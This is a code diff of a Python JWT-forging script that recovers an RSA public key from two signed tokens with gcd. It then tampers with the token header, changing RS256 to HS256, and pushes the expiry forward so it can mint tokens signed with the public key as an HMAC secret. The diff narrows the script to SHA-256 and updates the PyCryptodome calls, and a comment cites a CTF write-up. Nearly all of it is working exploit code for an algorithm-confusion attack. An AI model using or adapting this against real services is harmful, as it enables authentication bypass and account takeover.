@@ -3,8 +3,8 @@ import json
 import base64
 from gmpy2 import mpz,gcd,c_div
 import binascii
-from Crypto.Hash import SHA256, SHA384, SHA512
-from Crypto.Signature import PKCS1_v1_5 # god bless http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/
+from Crypto.Hash import SHA256
+from Crypto.Signature import pkcs1_15 # god bless http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/
 import asn1tools
 import binascii
 import time
@@ -23,7 +23,7 @@ def bytes2mpz(b):
 
 def der2pem(der, token="RSA PUBLIC KEY"):
     der_b64=base64.b64encode(der).decode('ascii')
-    
+
     lines=[ der_b64[i:i+64] for i in range(0, len(der_b64), 64) ]
     return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (token, "\n".join(lines), token)
 
@@ -33,8 +33,7 @@ def forge_mac(jwt0, public_key):
     jwt0_msg=b'.'.join(jwt0_parts[0:2])
 
     alg=b64urldecode(jwt0_parts[0].decode('utf8'))
-    # Always use HS256
-    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256").replace(b"RS384", b"HS256").replace(b"RS512", b"HS256"))
+    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256"))
 
     payload=json.loads(b64urldecode(jwt0_parts[1].decode('utf8')))
     payload['exp'] = int(time.time())+86400
@@ -58,14 +57,7 @@ alg1=json.loads(b64urldecode(jwt1.split('.')[0]))
 
 if not alg0["alg"].startswith("RS") or not alg1["alg"].startswith("RS"):
     raise Exception("Not RSA signed tokens!")
-if alg0["alg"] == "RS256":
-    HASH = SHA256
-elif alg0["alg"] == "RS384":
-    HASH = SHA384
-elif alg0["alg"] == "RS512":
-    HASH = SHA512
-else:
-    raise Exception("Invalid algorithm")
+
 jwt0_sig_bytes = b64urldecode(jwt0.split('.')[2])
 jwt1_sig_bytes = b64urldecode(jwt1.split('.')[2])
 if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
@@ -75,14 +67,14 @@ jwt0_sig = bytes2mpz(jwt0_sig_bytes)
 jwt1_sig = bytes2mpz(jwt1_sig_bytes)
 
 jks0_input = ".".join(jwt0.split('.')[0:2])
-hash_0=HASH.new(jks0_input.encode('ascii'))
-padded0 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(hash_0, len(jwt0_sig_bytes))
+sha256_0=SHA256.new(jks0_input.encode('ascii'))
+padded0 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(sha256_0, len(jwt0_sig_bytes))
 
 jks1_input = ".".join(jwt1.split('.')[0:2])
-hash_1=HASH.new(jks1_input.encode('ascii'))
-padded1 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(hash_1, len(jwt0_sig_bytes))
+sha256_1=SHA256.new(jks1_input.encode('ascii'))
+padded1 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(sha256_1, len(jwt0_sig_bytes))
 
-m0 = bytes2mpz(padded0) 
+m0 = bytes2mpz(padded0)
 m1 = bytes2mpz(padded1)
 
 pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
